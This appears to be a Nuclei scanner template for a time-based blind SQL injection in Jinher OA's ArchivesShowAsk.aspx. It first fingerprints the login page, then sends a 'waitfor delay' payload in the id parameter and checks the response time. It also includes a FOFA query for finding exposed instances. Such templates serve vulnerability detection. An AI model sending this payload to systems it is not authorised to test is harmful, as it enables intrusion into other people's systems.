id: jinher-archivesshowask-aspx-sqli
info:
  name: 金和OA ArchivesShowAsk.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: "金和OA"
    fofa-query: "app=\"金和网络-金和OA\""

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        words:
          - "JHSoft"
        part: body

  - raw:
      - |
        GET /c6/Jhsoft.Web.Archives/ArchivesShowAsk.aspx/?id=1'waitfor+delay'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ""
        part: body
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
